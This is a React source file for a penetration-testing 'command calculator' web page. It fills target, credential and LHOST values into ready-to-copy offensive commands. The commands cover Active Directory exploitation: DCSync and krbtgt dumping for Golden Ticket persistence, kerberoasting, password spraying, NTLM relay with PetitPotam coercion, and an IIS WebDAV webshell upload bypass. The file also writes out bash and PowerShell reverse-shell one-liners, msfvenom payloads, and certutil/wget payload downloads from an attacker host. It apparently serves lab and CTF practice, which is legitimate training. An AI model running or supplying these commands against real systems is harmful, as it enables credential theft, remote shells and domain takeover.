import React, { useState, useMemo } from "react";

/**
 * Command Calculator — a standalone page for The Path.
 * Fill the variable bar once; get paste-ready commands across your toolset.
 * The auth-mode toggle (password / NTLM hash / Kerberos) rewrites EVERY command.
 * Self-contained: no external CSS/UI deps. Drop in as a route like the pivot calculator.
 */

const FIELDS = [
  { k: "ip", label: "Target IP", ph: "10.10.10.5" },
  { k: "dcip", label: "DC IP", ph: "10.10.10.10" },
  { k: "host", label: "Hostname", ph: "dc01.corp.local" },
  { k: "domain", label: "Domain", ph: "corp.local" },
  { k: "user", label: "User", ph: "jdoe" },
  { k: "secret", label: "Password / Hash", ph: "Password123!", secret: true },
  { k: "lhost", label: "LHOST (tun0)", ph: "10.10.14.7" },
  { k: "lport", label: "LPORT", ph: "4444" },
];

const AUTH = [
  { id: "pw", label: "Password" },
  { id: "hash", label: "NTLM Hash" },
  { id: "krb", label: "Kerberos" },
];

// split a command string into plain text + amber <TOKEN> placeholders
function tokenize(cmd) {
  return cmd.split(/(<[A-Z0-9_]+>)/g).map((part, i) =>
    /^<[A-Z0-9_]+>$/.test(part)
      ? <span key={i} className="tok">{part}</span>
      : <span key={i}>{part}</span>
  );
}

function CmdCard({ label, cmd, note }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard?.writeText(cmd);
    setCopied(true);
    setTimeout(() => setCopied(false), 1400);
  };
  return (
    <div className="cmd" onClick={copy} title="Click to copy">
      <div className="cmd-head">
        <span className="cmd-label">{label}</span>
        <span className={`cmd-copy${copied ? " ok" : ""}`}>{copied ? "copied" : "copy"}</span>
      </div>
      <pre className="cmd-text">{tokenize(cmd)}</pre>
      {note && <div className="cmd-note">{note}</div>}
    </div>
  );
}

function Chip({ label, value }) {
  const [copied, setCopied] = useState(false);
  const copy = () => {
    navigator.clipboard?.writeText(value);
    setCopied(true);
    setTimeout(() => setCopied(false), 1400);
  };
  return (
    <div className="chip" onClick={copy} title="Click to copy">
      <span className="chip-label">{label}</span>
      <span className="chip-val">{copied ? "copied" : value}</span>
    </div>
  );
}

export default function CommandCalculator() {
  const [f, setF] = useState({
    ip: "", dcip: "", host: "", domain: "", user: "", secret: "", lhost: "", lport: "",
  });
  const [authMode, setAuthMode] = useState("pw");
  const [active, setActive] = useState("setup");
  const [filter, setFilter] = useState("");

  const set = (k) => (e) => setF((v) => ({ ...v, [k]: e.target.value }));

  // ── derived tokens ──────────────────────────────────────
  const IP = f.ip || "<IP>";
  const DCIP = f.dcip || "<DC_IP>";
  const HOST = f.host || "<HOST>";
  const D = f.domain || "<DOMAIN>";
  const U = f.user || "<USER>";
  const SEC = f.secret || (authMode === "hash" ? "<HASH>" : "<PASS>");
  const LHOST = f.lhost || "<LHOST>";
  const LPORT = f.lport || "4444";
  const baseDN = f.domain ? f.domain.split(".").map((p) => `dc=${p}`).join(",") : "dc=<DOMAIN>";
  const NB = f.domain ? (f.domain.split(".")[0] || "").toUpperCase() : "<NB>";
  const hostsLine = `${IP}\t${HOST} ${D} ${HOST.split(".")[0]}`;

  // target host: Kerberos demands the hostname, everything else the IP
  const TH = authMode === "krb" ? HOST : IP;

  // ── auth-aware fragment builders ────────────────────────
  const impTgt = (forceHost = false) => {
    const t = authMode === "krb" || forceHost ? HOST : IP;
    if (authMode === "pw") return `'${D}/${U}:${SEC}@${t}'`;
    if (authMode === "hash") return `'${D}/${U}@${t}' -hashes :${SEC}`;
    return `'${D}/${U}@${t}' -k -no-pass -dc-ip ${DCIP}`;
  };
  const nxcA = () => {
    if (authMode === "pw") return `-u '${U}' -p '${SEC}'`;
    if (authMode === "hash") return `-u '${U}' -H '${SEC}'`;
    return `-u '${U}' -k`;
  };
  const winrmAuth =
    authMode === "pw" ? `-p '${SEC}'` : authMode === "hash" ? `-H ${SEC}` : `-r ${D}`;
  const ldapAuth = `-D "${U}@${D}" -w '${SEC}'`;

  // ── services ────────────────────────────────────────────
  const services = useMemo(() => ({
    setup: {
      name: "Setup", groups: [
        { phase: "Resolve & scope", cmds: [
          { label: "Add to /etc/hosts", cmd: `echo "${hostsLine}" | sudo tee -a /etc/hosts`, note: "Kills the stale-/.com hostname gotcha before it bites." },
          { label: "Export shell vars", cmd: `export IP=${IP} DC=${DCIP} DOMAIN=${D} USER='${U}'` },
        ]},
        { phase: "First-touch nmap", cmds: [
          { label: "Full TCP sweep", cmd: `sudo nmap -p- --min-rate 2000 -Pn ${IP} -oN nmap/all.txt` },
          { label: "Service + scripts on open ports", cmd: `sudo nmap -sCV -p PORTS ${IP} -oN nmap/svc.txt`, note: "Replace PORTS with the open ports from the sweep." },
          { label: "UDP top ports", cmd: `sudo nmap -sU --top-ports 50 -Pn ${IP} -oN nmap/udp.txt` },
        ]},
      ],
    },
    ad: {
      name: "AD Attacks", groups: [
        { phase: "Auth & exec", cmds: [
          { label: "psexec", cmd: `impacket-psexec ${impTgt()}` },
          { label: "wmiexec (quieter)", cmd: `impacket-wmiexec ${impTgt()}` },
          { label: "smbexec", cmd: `impacket-smbexec ${impTgt()}` },
          { label: "atexec (single cmd)", cmd: `impacket-atexec ${impTgt()} 'whoami'` },
        ]},
        { phase: "Credentials", cmds: [
          { label: "secretsdump — DCSync (NTLM only)", cmd: `impacket-secretsdump ${impTgt()} -just-dc-ntlm -outputfile dcsync` },
          { label: "secretsdump — one user", cmd: `impacket-secretsdump ${impTgt()} -just-dc-user Administrator` },
          { label: "secretsdump — krbtgt (Golden prep)", cmd: `impacket-secretsdump ${impTgt()} -just-dc-user krbtgt`, note: "Grab krbtgt even if you don't use it — enables Golden Ticket persistence." },
          { label: "secretsdump — local SAM/LSA", cmd: `impacket-secretsdump ${impTgt()}` },
          { label: "Password spray (nxc)", cmd: `nxc smb ${IP} -u users.txt -p '${SEC}' --continue-on-success`, note: "Check --pass-pol first. One spray per lockout window." },
        ]},
        { phase: "Roasting", cmds: [
          { label: "Kerberoast (nxc)", cmd: `nxc ldap ${IP} ${nxcA()} --kerberoasting kerb.txt` },
          { label: "Kerberoast (impacket)", cmd: authMode === "krb"
            ? `impacket-GetUserSPNs -k -no-pass -dc-ip ${DCIP} ${D}/${U} -request -outputfile kerb.txt`
            : `impacket-GetUserSPNs ${D}/${U}:'${SEC}' -dc-ip ${DCIP} -request -outputfile kerb.txt` },
          { label: "AS-REP roast (nxc)", cmd: `nxc ldap ${IP} ${nxcA()} --asreproast asrep.txt` },
          { label: "AS-REP roast (impacket, userlist)", cmd: `impacket-GetNPUsers ${D}/ -dc-ip ${DCIP} -usersfile users.txt -no-pass -outputfile asrep.txt` },
        ]},
      ],
    },
    enum: {
      name: "Enumeration", groups: [
        { phase: "SMB / host", cmds: [
          { label: "nxc smb — host info", cmd: `nxc smb ${IP} ${nxcA()}` },
          { label: "nxc smb — users", cmd: `nxc smb ${IP} ${nxcA()} --users` },
          { label: "nxc smb — shares", cmd: `nxc smb ${IP} ${nxcA()} --shares` },
          { label: "nxc smb — pass policy", cmd: `nxc smb ${IP} ${nxcA()} --pass-pol` },
          { label: "enum4linux-ng", cmd: `enum4linux-ng -A ${IP} -u '${U}' -p '${SEC}'` },
          { label: "rpcclient (null)", cmd: `rpcclient -U "" -N ${IP}`, note: "Then: enumdomusers, querydispinfo, enumdomgroups." },
        ]},
        { phase: "Kerbrute / userlists", cmds: [
          { label: "kerbrute — userenum", cmd: `kerbrute userenum -d ${D} --dc ${DCIP} users.txt` },
          { label: "BloodHound (python)", cmd: `bloodhound-python -u '${U}' -p '${SEC}' -d ${D} -ns ${DCIP} -c All --zip` },
        ]},
      ],
    },
    ldap: {
      name: "LDAP", groups: [
        { phase: "Connect & recon", cmds: [
          { label: "rootDSE (anon)", cmd: `ldapsearch -x -H ldap://${IP} -s base -b "" "(objectClass=*)" "*" +` },
          { label: "All users (authed)", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(objectClass=user)" sAMAccountName description memberOf` },
          { label: "Computers", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(objectClass=computer)" dNSHostName operatingSystem` },
          { label: "windapsearch — DA group", cmd: `windapsearch -d ${D} --dc-ip ${DCIP} -u '${U}@${D}' -p '${SEC}' --da` },
        ]},
        { phase: "UAC bitmask filters", cmds: [
          { label: "Kerberoastable (SPN set)", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName` },
          { label: "AS-REP roastable (no preauth)", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName` },
          { label: "Password in description", cmd: `ldapsearch -x -H ldap://${IP} ${ldapAuth} -b "${baseDN}" "(description=*pass*)" sAMAccountName description` },
        ]},
      ],
    },
    smb: {
      name: "SMB", groups: [
        { phase: "Shares", cmds: [
          { label: "smbmap", cmd: `smbmap -H ${IP} -u '${U}' -p '${SEC}' -d ${D}` },
          { label: "smbclient — list", cmd: `smbclient -L //${IP}/ -U '${D}/${U}%${SEC}'` },
          { label: "smbclient — connect", cmd: `smbclient //${IP}/SHARE -U '${D}/${U}%${SEC}'` },
          { label: "nxc — spider shares", cmd: `nxc smb ${IP} ${nxcA()} -M spider_plus` },
        ]},
      ],
    },
    kerberos: {
      name: "Kerberos", groups: [
        { phase: "Tickets", cmds: [
          { label: "Request TGT", cmd: `impacket-getTGT ${D}/${U}:'${SEC}' -dc-ip ${DCIP}`, note: "Then: export KRB5CCNAME=${U}.ccache" },
          { label: "Use ccache (-k -no-pass)", cmd: `export KRB5CCNAME=${U}.ccache\nimpacket-psexec -k -no-pass ${D}/${U}@${HOST} -dc-ip ${DCIP}` },
          { label: "Golden ticket (ticketer)", cmd: `impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain ${D} Administrator` },
        ]},
      ],
    },
    mssql: {
      name: "MSSQL", groups: [
        { phase: "Connect & exec", cmds: [
          { label: "mssqlclient", cmd: authMode === "krb"
            ? `impacket-mssqlclient -k ${D}/${U}@${HOST} -dc-ip ${DCIP}`
            : `impacket-mssqlclient ${D}/${U}:'${SEC}'@${IP} -windows-auth` },
          { label: "enable xp_cmdshell", cmd: `EXEC sp_configure 'show advanced options',1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\nEXEC xp_cmdshell 'whoami';` },
        ]},
      ],
    },
    winrm: {
      name: "WinRM", groups: [
        { phase: "Shell", cmds: [
          { label: "evil-winrm", cmd: `evil-winrm -i ${TH} -u ${U} ${winrmAuth}`, note: authMode === "krb" ? "Needs KRB5CCNAME set + host in /etc/hosts." : null },
          { label: "nxc winrm — check + exec", cmd: `nxc winrm ${IP} ${nxcA()} -x 'whoami'` },
        ]},
      ],
    },
    rdp: {
      name: "RDP", groups: [
        { phase: "Connect", cmds: [
          { label: "xfreerdp", cmd: authMode === "hash"
            ? `xfreerdp /u:${U} /pth:${SEC} /v:${IP} +clipboard /cert:ignore`
            : `xfreerdp /u:${U} /p:'${SEC}' /v:${TH} +clipboard /cert:ignore` },
          { label: "nxc rdp — check", cmd: `nxc rdp ${IP} ${nxcA()}` },
        ]},
      ],
    },
    relay: {
      name: "Relay / Poison", groups: [
        { phase: "Capture & relay", cmds: [
          { label: "responder", cmd: `sudo responder -I tun0 -wd` },
          { label: "ntlmrelayx (to SMB)", cmd: `impacket-ntlmrelayx -tf targets.txt -smb2support` },
          { label: "coerce (PetitPotam)", cmd: `python3 PetitPotam.py -u '${U}' -p '${SEC}' -d ${D} ${LHOST} ${IP}` },
        ]},
      ],
    },
    webdav: {
      name: "WebDAV", groups: [
        { phase: "Detect", cmds: [
          { label: "nmap — methods + webdav-scan", cmd: `nmap -p 80,443 --script http-webdav-scan,http-methods ${IP}` },
          { label: "OPTIONS — look for PUT in Allow", cmd: `curl -s -i -X OPTIONS http://${IP}/ | grep -i -E 'allow|dav'` },
          { label: "Probe common dirs", cmd: `for d in / /webdav/ /dav/ /uploads/ /files/; do echo "== $d =="; curl -s -i -X OPTIONS http://${IP}$d | grep -i allow; done`, note: "PUT in the Allow line = you can upload there." },
        ]},
        { phase: "Confirm what lands (davtest)", cmds: [
          { label: "davtest", cmd: `davtest -url http://${IP}` },
          { label: "davtest — authed", cmd: `davtest -url http://${IP} -auth '${U}:${SEC}'`, note: `Domain box? try the prefixed form '${NB}\\${U}:${SEC}'.` },
        ]},
        { phase: "Upload → RCE (IIS bypass)", cmds: [
          { label: "Make the shell (IIS / PHP)", cmd: `cp /usr/share/webshells/aspx/cmdasp.aspx shell.aspx\ncp /usr/share/webshells/php/php-reverse-shell.php shell.php`, note: "IIS runs .aspx; Apache/PHP runs .php. A .php shell on IIS just downloads as text." },
          { label: "PUT .txt then MOVE to .aspx", cmd: `curl -s -u '${U}:${SEC}' -X PUT http://${IP}/shell.txt --data-binary @shell.aspx\ncurl -s -u '${U}:${SEC}' -X MOVE http://${IP}/shell.txt -H "Destination: http://${IP}/shell.aspx"`, note: "IIS blocks PUT of .aspx directly but allows .txt → MOVE renames server-side. Add --ntlm if it negotiates NTLM." },
          { label: "Direct PUT (PHP stack)", cmd: `curl -s -u '${U}:${SEC}' -X PUT http://${IP}/shell.php --data-binary @shell.php` },
          { label: "Trigger it", cmd: `curl "http://${IP}/shell.aspx"   # browse to execute` },
        ]},
        { phase: "Interactive (cadaver)", cmds: [
          { label: "cadaver — open session", cmd: `cadaver http://${IP}/`, note: "Prompts for creds if WebDAV needs auth. Use the path OPTIONS confirmed." },
          { label: "Inside the dav:/> prompt", cmd: `put shell.aspx              # upload your shell\nmove shell.txt shell.aspx   # IIS bypass: rename server-side\nls                          # list remote dir\nget web.config              # pull files (configs, creds)\nmkcol loot                  # make a dir\ndelete shell.aspx           # clean up when done`, note: "These are cadaver commands, not shell — type them at the dav:/> prompt." },
          { label: "Non-interactive auth (~/.netrc)", cmd: `echo "machine ${IP} login ${U} password ${SEC}" >> ~/.netrc && chmod 600 ~/.netrc\ncadaver http://${IP}/`, note: "cadaver auto-reads ~/.netrc so it won't prompt." },
        ]},
      ],
    },
    payloads: {
      name: "Payloads / Shells", groups: [
        { phase: "msfvenom", cmds: [
          { label: "Windows x64 reverse exe", cmd: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f exe -o shell.exe` },
          { label: "Linux x64 reverse elf", cmd: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${LHOST} LPORT=${LPORT} -f elf -o shell.elf` },
        ]},
        { phase: "One-liners & listeners", cmds: [
          { label: "Bash reverse shell", cmd: `bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'` },
          { label: "PowerShell reverse (IEX cradle)", cmd: `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${LHOST}',${LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS> ';$sby=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()}"` },
          { label: "Listener (rlwrap nc)", cmd: `rlwrap -cAr nc -lvnp ${LPORT}` },
        ]},
      ],
    },
    transfer: {
      name: "File Transfer", groups: [
        { phase: "Serve", cmds: [
          { label: "HTTP server (Kali)", cmd: `python3 -m http.server 80` },
          { label: "SMB server (impacket)", cmd: `impacket-smbserver share $(pwd) -smb2support -user kali -password kali` },
        ]},
        { phase: "Pull (on target)", cmds: [
          { label: "Windows — certutil", cmd: `certutil -urlcache -f http://${LHOST}/shell.exe shell.exe` },
          { label: "Windows — PowerShell iwr", cmd: `iwr -Uri http://${LHOST}/shell.exe -OutFile shell.exe` },
          { label: "Linux — wget", cmd: `wget http://${LHOST}/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh` },
        ]},
      ],
    },
    cracking: {
      name: "Hash Cracking", groups: [
        { phase: "hashcat modes", cmds: [
          { label: "NTLM (-m 1000)", cmd: `hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt` },
          { label: "Kerberoast TGS (-m 13100)", cmd: `hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt` },
          { label: "AS-REP (-m 18200)", cmd: `hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt` },
          { label: "NetNTLMv2 (-m 5600)", cmd: `hashcat -m 5600 netntlm.txt /usr/share/wordlists/rockyou.txt` },
        ]},
      ],
    },
  }), [authMode, f, baseDN, NB, hostsLine, IP, DCIP, HOST, D, U, SEC, LHOST, LPORT, TH, ldapAuth, winrmAuth]);

  // ── global filter across every service ──────────────────
  const q = filter.trim().toLowerCase();
  const filtered = useMemo(() => {
    if (!q) return null;
    const out = [];
    for (const [id, svc] of Object.entries(services)) {
      const cmds = [];
      for (const g of svc.groups)
        for (const c of g.cmds)
          if (c.label.toLowerCase().includes(q) || c.cmd.toLowerCase().includes(q))
            cmds.push({ ...c, phase: g.phase });
      if (cmds.length) out.push({ id, name: svc.name, cmds });
    }
    return out;
  }, [q, services]);

  const svc = services[active];

  return (
    <div className="cc">
      <style>{css}</style>

      <header className="cc-hdr">
        <a href="/" className="cc-back">← The Path</a>
        <h1 className="cc-title">Command Calculator</h1>
        <p className="cc-sub">Fill the bar once · every command rewrites live · click to copy</p>
      </header>

      {/* VARIABLE BAR */}
      <div className="varbar">
        <div className="var-grid">
          {FIELDS.map(({ k, label, ph, secret }) => (
            <div key={k} className="var">
              <label>{label}</label>
              <input
                value={f[k]}
                onChange={set(k)}
                placeholder={ph}
                type={secret ? "text" : "text"}
                spellCheck={false}
                autoComplete="off"
              />
            </div>
          ))}
        </div>
        <div className="auth-row">
          <span className="auth-lbl">Auth mode</span>
          <div className="auth-toggle">
            {AUTH.map((a) => (
              <button
                key={a.id}
                className={`auth-btn${authMode === a.id ? " on" : ""}`}
                onClick={() => setAuthMode(a.id)}
              >
                {a.label}
              </button>
            ))}
          </div>
          <div className="derived">
            <Chip label="base DN" value={baseDN} />
            <Chip label="NETBIOS" value={NB} />
            <Chip label="/etc/hosts" value={hostsLine.replace("\t", "  ")} />
          </div>
        </div>
        {authMode === "krb" && (
          <div className="krb-banner">
            Kerberos mode — commands now target <b>{HOST}</b>, not the IP. Make sure the host is in
            <code> /etc/hosts</code> and you've run <code>export KRB5CCNAME=ticket.ccache</code>.
          </div>
        )}
      </div>

      {/* FILTER */}
      <div className="filter-wrap">
        <input
          className="filter"
          value={filter}
          onChange={(e) => setFilter(e.target.value)}
          placeholder="Filter every binary — psexec, kerberoast, snmpwalk…"
          spellCheck={false}
        />
        {filter && <button className="filter-clear" onClick={() => setFilter("")}>clear</button>}
      </div>

      {/* CONTENT */}
      {filtered ? (
        <div className="results">
          {filtered.length === 0 ? (
            <div className="empty">No command matches “{filter}”. Try a binary name or flag.</div>
          ) : (
            filtered.map((s) => (
              <section key={s.id} className="svc-block">
                <h2 className="svc-name">{s.name}</h2>
                <div className="cmd-list">
                  {s.cmds.map((c, i) => <CmdCard key={i} {...c} />)}
                </div>
              </section>
            ))
          )}
        </div>
      ) : (
        <>
          <nav className="tabs">
            {Object.entries(services).map(([id, s]) => (
              <button
                key={id}
                className={`tab${active === id ? " on" : ""}`}
                onClick={() => setActive(id)}
              >
                {s.name}
              </button>
            ))}
          </nav>
          <div className="results">
            {svc.groups.map((g, gi) => (
              <section key={gi} className="svc-block">
                <h2 className="svc-name">{g.phase}</h2>
                <div className="cmd-list">
                  {g.cmds.map((c, i) => <CmdCard key={i} {...c} />)}
                </div>
              </section>
            ))}
          </div>
        </>
      )}
    </div>
  );
}

const css = `
  @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;700&family=JetBrains+Mono:wght@400;500;700&display=swap');
  .cc *{box-sizing:border-box;margin:0;padding:0}
  .cc{
    --bg:#0b0f14; --panel:#11161d; --panel2:#0d1219; --line:#1d2630;
    --ink:#c4d0dc; --dim:#5f7184; --amber:#f5a623; --amber-soft:#f5a62322;
    --accent:#7fb3ff; --ok:#6ee7a8;
    min-height:100vh; background:var(--bg); color:var(--ink);
    font-family:'JetBrains Mono',ui-monospace,monospace; padding:1.5rem 1rem 4rem;
  }
  .cc-hdr{max-width:1080px;margin:0 auto 1.1rem}
  .cc-back{color:var(--dim);font-size:.72rem;text-decoration:none}
  .cc-back:hover{color:var(--amber)}
  .cc-title{font-family:'Space Grotesk',sans-serif;font-weight:700;font-size:1.7rem;letter-spacing:-.01em;margin-top:.35rem;color:#eaf1f8}
  .cc-sub{font-size:.7rem;color:var(--dim);margin-top:.15rem;letter-spacing:.02em}

  .varbar{position:sticky;top:0;z-index:20;max-width:1080px;margin:0 auto 1rem;
    background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:.9rem;
    box-shadow:0 8px 30px -12px #000a}
  .var-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:.55rem}
  .var{display:flex;flex-direction:column;gap:.22rem}
  .var label{font-size:.54rem;text-transform:uppercase;letter-spacing:.1em;color:var(--dim)}
  .var input{background:var(--panel2);border:1px solid var(--line);border-radius:6px;
    padding:.42rem .55rem;color:var(--ink);font-family:inherit;font-size:.74rem;outline:none;transition:border-color .12s}
  .var input:focus{border-color:var(--amber)}
  .var input::placeholder{color:#33414f}

  .auth-row{display:flex;align-items:center;gap:.8rem;flex-wrap:wrap;margin-top:.85rem;
    padding-top:.8rem;border-top:1px solid var(--line)}
  .auth-lbl{font-size:.56rem;text-transform:uppercase;letter-spacing:.12em;color:var(--dim)}
  .auth-toggle{display:inline-flex;background:var(--panel2);border:1px solid var(--line);border-radius:7px;padding:2px}
  .auth-btn{background:none;border:none;color:var(--dim);font-family:inherit;font-size:.68rem;
    padding:.34rem .8rem;border-radius:5px;cursor:pointer;transition:all .12s}
  .auth-btn:hover{color:var(--ink)}
  .auth-btn.on{background:var(--amber);color:#1a1206;font-weight:700}
  .derived{display:flex;gap:.4rem;flex-wrap:wrap;margin-left:auto}
  .chip{display:flex;flex-direction:column;gap:1px;background:var(--panel2);border:1px solid var(--line);
    border-radius:6px;padding:.3rem .55rem;cursor:pointer;transition:border-color .12s;max-width:260px}
  .chip:hover{border-color:var(--accent)}
  .chip-label{font-size:.5rem;text-transform:uppercase;letter-spacing:.1em;color:var(--dim)}
  .chip-val{font-size:.66rem;color:var(--accent);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}

  .krb-banner{margin-top:.75rem;background:var(--amber-soft);border:1px solid #f5a62355;border-radius:7px;
    padding:.5rem .7rem;font-size:.66rem;line-height:1.5;color:#f0c987}
  .krb-banner code{background:#0006;padding:.04rem .3rem;border-radius:3px;color:#ffd98a}
  .krb-banner b{color:#ffd98a}

  .filter-wrap{max-width:1080px;margin:0 auto 1rem;display:flex;gap:.5rem;align-items:center}
  .filter{flex:1;background:var(--panel);border:1px solid var(--line);border-radius:8px;
    padding:.55rem .75rem;color:var(--ink);font-family:inherit;font-size:.74rem;outline:none;transition:border-color .12s}
  .filter:focus{border-color:var(--amber)}
  .filter::placeholder{color:#3a4856}
  .filter-clear{background:none;border:1px solid var(--line);color:var(--dim);border-radius:6px;
    padding:.5rem .7rem;font-family:inherit;font-size:.66rem;cursor:pointer}
  .filter-clear:hover{color:var(--ink);border-color:var(--dim)}

  .tabs{max-width:1080px;margin:0 auto .9rem;display:flex;gap:.3rem;flex-wrap:wrap}
  .tab{background:var(--panel);border:1px solid var(--line);color:var(--dim);border-radius:6px;
    padding:.34rem .7rem;font-family:inherit;font-size:.66rem;cursor:pointer;transition:all .12s}
  .tab:hover{color:var(--ink);border-color:var(--dim)}
  .tab.on{color:var(--amber);border-color:var(--amber);background:#1c150622}

  .results{max-width:1080px;margin:0 auto;display:flex;flex-direction:column;gap:1.3rem}
  .svc-block{display:flex;flex-direction:column;gap:.55rem}
  .svc-name{font-family:'Space Grotesk',sans-serif;font-size:.78rem;font-weight:700;color:#9fb4c8;
    text-transform:uppercase;letter-spacing:.12em;padding-bottom:.4rem;border-bottom:1px solid var(--line)}
  .cmd-list{display:grid;grid-template-columns:1fr;gap:.5rem}

  .cmd{background:var(--panel2);border:1px solid var(--line);border-radius:8px;overflow:hidden;
    cursor:pointer;transition:border-color .12s,transform .08s}
  .cmd:hover{border-color:#2b3a49}
  .cmd:active{transform:translateY(1px)}
  .cmd-head{display:flex;justify-content:space-between;align-items:center;
    padding:.4rem .65rem;background:#0a0e13;border-bottom:1px solid var(--line)}
  .cmd-label{font-size:.64rem;color:var(--accent);letter-spacing:.02em}
  .cmd-copy{font-size:.56rem;text-transform:uppercase;letter-spacing:.1em;color:var(--dim)}
  .cmd-copy.ok{color:var(--ok)}
  .cmd-text{padding:.6rem .65rem;font-size:.7rem;line-height:1.7;color:#aac4e0;
    white-space:pre-wrap;word-break:break-all}
  .cmd-text .tok{color:var(--amber);background:var(--amber-soft);border-radius:3px;padding:0 .15rem;font-weight:500}
  .cmd-note{padding:.4rem .65rem;border-top:1px solid var(--line);font-size:.6rem;color:var(--dim);line-height:1.5}

  .empty{text-align:center;padding:2.5rem;color:var(--dim);font-size:.74rem}

  @media (max-width:560px){
    .derived{margin-left:0;width:100%}
    .cmd-text{word-break:break-all}
  }
`;
